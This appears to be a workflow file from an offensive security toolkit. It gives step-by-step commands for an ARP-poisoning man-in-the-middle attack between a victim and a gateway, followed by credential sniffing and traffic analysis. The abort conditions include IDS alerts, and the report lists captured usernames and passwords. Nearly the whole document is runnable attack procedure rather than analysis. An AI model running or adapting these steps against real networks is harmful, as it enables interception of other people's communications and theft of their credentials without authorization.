# Workflow: MITM & Credential Capture

**ID:** 09_mitm_credential
**Risk Level:** HIGH — Active network attacks, traffic interception
**Estimated Duration:** 10-60 minutes
**Requires:** Root privileges, network access between targets

## Objective

Intercept network traffic via ARP poisoning or other MITM techniques
to capture credentials and analyze communications.

## Pre-Flight Checks

1. **Root access:** `whoami` (must be root)
2. **Interface up:** `ip link show <IFACE>`
3. **Tools:** `which ettercap dsniff tcpdump tshark`

## Steps

### Step 1: Passive Capture (baseline)

```bash
npx tsx tactical/modules/module_runner.ts packet_capture \
  --interface eth0 --duration 30 --output-file /tmp/baseline.pcap
```

### Step 2: ARP Poisoning (MITM)

```bash
npx tsx tactical/modules/module_runner.ts mitm_framework \
  --interface eth0 --target1 VICTIM_IP --target2 GATEWAY_IP \
  --mode arp --duration 120
```

### Step 3: Credential Sniffing (concurrent with Step 2)

```bash
npx tsx tactical/modules/module_runner.ts credential_sniffer \
  --interface eth0 --duration 120
```

### Step 4: Traffic Analysis

```bash
npx tsx tactical/modules/module_runner.ts traffic_analyzer \
  --input-file /tmp/baseline.pcap --mode http
```

## Abort Conditions

- Network disruption detected
- IDS alerts
- Target loses connectivity

## Reporting

- Credentials captured: protocol, username, password
- Traffic patterns: top talkers, protocols, HTTP requests
- MITM success: ARP cache poisoned, packets intercepted
